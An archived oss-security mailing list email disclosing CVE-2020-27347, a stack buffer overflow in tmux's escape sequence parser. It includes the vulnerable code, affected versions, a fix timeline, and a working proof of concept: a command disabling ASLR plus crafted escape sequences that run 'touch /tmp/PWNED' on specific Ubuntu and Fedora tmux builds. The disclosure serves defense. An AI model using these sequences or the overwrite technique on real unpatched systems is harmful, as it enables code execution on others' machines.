X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2145" "Thursday" "5" "November" "2020" "16:03:12" "+0300" "snizovtsev@gmail.com" "snizovtsev@gmail.com" "<0bec66ec9fbf5d386845d6be2c0fbd96b5d82405.camel@gmail.com>" "71" "[oss-security] CVE-2020-27347: tmux buffer overflow in escape sequence parser" nil nil nil "11" "2020110513:03:12" "[oss-security] CVE-2020-27347: tmux buffer overflow in escape sequence parser" (number mark "U       snizovtsev@g Nov  5   71/2145  " thread-indent "\"[oss-security] CVE-2020-27347: tmux buffer overflow in escape sequence parser\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] CVE-2020-27347: tmux buffer overflow in escape sequence parser" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 31965 invoked by uid 550); 5 Nov 2020 14:04:05 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 1459 invoked from network); 5 Nov 2020 13:03:26 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=message-id:subject:from:to:date:user-agent:mime-version
         :content-transfer-encoding;
        bh=EMeCgJKboTZYiXLtl+DCjIAEd2CF4X1YBR70T4On2IA=;
        b=LyWeKudHwMXJSwBeMstEKUdJ7UEvmF9guqYDiWfZob3vQaPJMEGJihr0Dc7d2qUKzm
         YEA5mcNh/0/IB+MUWWnMoNdJGliIiLYqNufXw1HnoBsYfw2kwSlvv2zvHB1MPoYHkFxp
         41i6vS5S3OEPC5IRrGcp9mzWHriVyDNVQVjJAanygYbRneaP1OVhwnkc3lkcSPZ3Ql7W
         PjPLkX0oA7oCby+ioPtLMrYIOh+abfVkkg3cF+tynb3Y7SbykUqEf/zA9IZMopUPziEv
         NLBOLgpBZ+xqegPUa4RKAHyJFzXAl3cf+VBtmc0bBQnmXu4aoME9JfxHulxrzEOOH41P
         g5Ag==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:message-id:subject:from:to:date:user-agent
         :mime-version:content-transfer-encoding;
        bh=EMeCgJKboTZYiXLtl+DCjIAEd2CF4X1YBR70T4On2IA=;
        b=MWXQq2tUgTUk1+U9ySmKHlmVbGwupBFt0lTishBXi9Pzd3NMLkXbCN3UGz9eJxspOR
         oLOhGUeohmJxxVvgC8pOPqz5j8XPDcDzqlCM5JEAx3bvmfvJeOvku2CbSBufNOpF0OCi
         t1fgni9rw3rHkw54PWKWyWnEAEGEeOUm6hlqJep7cKkn41dSByICk2mUCb6a/6mx18wH
         /B9WzYXWe9gRUfycLIdlbyfA7ZNs4FSpZifRWwlNePERyD5JQFVj8YtnIBzwfauLGon1
         IOwT2daA/cqeCB0pz+XMPuAhdvBh5V2sRDHuGR86flMtrbwc2hSvbB1uiD9Hv9ZbpYvI
         Q7Gg==
X-Gm-Message-State: AOAM532YSZp/7QDYDDoqTB/5f11UTFNLSFoUJC3tTvjKqU4k1DTpEROa
	0ZiK4Vo5tsi3SZOt9NMbUs3EJbwOcmM=
X-Google-Smtp-Source: ABdhPJwdSsZ0oG2eW570vjVkqejHHYtGHQ+B81TiwKqh8jTBBmxgReN/pBzVrOQzTdRyhUtajlEEGw==
X-Received: by 2002:a2e:8851:: with SMTP id z17mr792755ljj.58.1604581394779;
        Thu, 05 Nov 2020 05:03:14 -0800 (PST)
Message-ID: <0bec66ec9fbf5d386845d6be2c0fbd96b5d82405.camel@gmail.com>
From: snizovtsev@gmail.com
To: oss-security@lists.openwall.com
Date: Thu, 05 Nov 2020 16:03:12 +0300
Content-Type: text/plain; charset="UTF-8"
User-Agent: Evolution 3.36.5 
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Subject: [oss-security] CVE-2020-27347: tmux buffer overflow in escape sequence parser

Hi,

I recently discovered a bug in tmux (terminal multiplexer) which could
lead to crash or code execution. The bug was in
`input_csi_dispatch_sgr_colon` function which is used by tmux server
process.

The problem is that a bound check for a stack-allocated array `p` is
bypassed if 8th chunk of input buffer is empty:

        while ((out = strsep(&ptr, ":")) != NULL) {
                if (*out != '\0') {
                        p[n++] = strtonum(out, 0, INT_MAX, &errstr);
                        if (errstr != NULL || n == nitems(p)) {
                                return;
                        }
                } else
                        n++;
        }

Thus by using an escape sequence like "\033[::::::7::1:2:3::5:6:7:m" we
can overwrite arbitrary 4-byte locations on the stack. Moreover, an
empty arguments ("::") may be used to skip choosen offsets, and thereby
keep stack canaries untouched.

Code execution is proved practical only if tmux address space isn't
fully randomized. So ASLR with PIE will mitigiate this issue but more
complex exploits may be theoretically created.

=== Affected versions / distributions ===

- tmux 2.9-3.1b
- Ubuntu 20.04
- Debian 11
- Fedora 31+
- Alpine 3.10+
- openSUSE Leap 15.2
- OpenBSD 6.5+

=== Exploitation (testing purposes only) ===

I haven't found any ways to leak addresses so ASLR must be disabled:
sysctl -w kernel.randomize_va_space=0

Then open tmux and feed it with the following sequence:

for tmux 3.0a-2ubuntu0.1 on Ubuntu 20.04.1 x86_64:

echo -e
'\033[::::::::::::::::::1431728064::::::::1431829797::::1431915746::m;t
ouch /tmp/PWNED;\0';
 
for tmux-3.1-2.fc33.x86_64 on Fedora 33:
echo -e
'\033[::::::::::::::::::1431723856::::::::1432185743::::1431836040::m;t
ouch /tmp/PWNED;\0';

If done, `/tmp/PWNED` would indicate that the attack succeed.

=== Timeline ===
* 29 Oct 2020 - Vulnerability reported to author, security ()
openbsd.org, RedHat, SUSE and Canonical.
* 29 Oct 2020 - OpenBSD Errata published.
* 29 Oct 2020 - Fixed in OpenBSD and tmux 3.1c.
* 30 Oct 2020 - CVE-2020-27347 assigned.
* 05 Nov 2020 - Vulnerability opened.

--
Regards,
Sergey Nizovtsev.

